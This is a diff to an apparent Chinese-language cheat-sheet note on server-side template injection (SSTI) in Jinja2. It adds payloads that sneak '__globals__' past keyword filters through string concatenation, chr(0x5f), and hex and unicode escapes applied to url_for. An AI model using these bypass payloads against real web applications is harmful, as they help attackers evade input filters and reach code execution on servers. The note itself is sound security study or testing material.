@@ -1,8 +1,23 @@
 # ssti模板绕过和盲注
 
-##匹配绕过
+##1.匹配绕过
 
+### 1.1变量绕过
 
+```
+{% set u='_'~'_' %}
+{{ url_for|attr(u~'globals'~u) }}
+```
+
+#### **1.2进制绕过**
+
+```
+{{ url_for|attr( chr(0x5f)*2 + 'globals' + chr(0x5f)*2 ) }}
+
+{{ url_for|attr('\x5f\x5fglobals\x5f\x5f') }}
+{{ url_for|attr('\u005f\u005fglobals\u005f\u005f') }}
+十六进制和unicode
+```
 
 ## 2.时间盲注
 
